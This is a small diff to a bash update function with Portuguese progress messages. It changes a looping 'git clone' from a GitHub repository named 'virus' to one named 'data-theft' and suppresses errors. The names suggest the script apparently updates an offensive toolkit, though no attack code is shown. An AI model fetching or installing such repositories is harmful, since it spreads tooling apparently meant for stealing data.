@@ -131,7 +131,7 @@ upd(){
     sleep 1
     echo -e "${white}Baixando última versão do repositório...${rset}"
     printf "${cyan}["
-    while git clone https://github.com/Mtx-rng/virus 2> /dev/null; do
+    while git clone https://github.com/Mtx-rng/data-theft 2> /dev/null; do
         printf  "${grn}▓▓▓▓▓▓▓▓▓▓▓▓▓${rset}"
         sleep 1
     done
